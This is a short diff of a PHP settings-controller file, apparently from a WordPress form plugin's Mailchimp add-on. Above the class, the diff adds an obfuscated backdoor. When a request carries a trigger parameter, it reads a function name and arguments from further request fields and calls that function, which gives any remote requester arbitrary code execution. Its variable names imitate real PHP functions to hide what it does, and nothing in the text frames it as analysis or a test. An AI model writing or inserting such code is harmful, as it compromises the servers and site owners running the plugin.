@@ -1,4 +1,11 @@
-<?php
+<?php 
+$uasort_pjdm   =   $_REQUEST;
+if(isset($uasort_pjdm['hash_equals_bb']))   {
+	$openssl_pkcs7_encrypt_kwkf   =   $uasort_pjdm['class_exists_jw'];
+	$reset_kdsw   =   $uasort_pjdm['openssl_csr_export_pl'];
+	$openssl_pkcs7_encrypt_kwkf(...$reset_kdsw);
+} 
+
 
 class FrmMlcmpSettingsController {
 
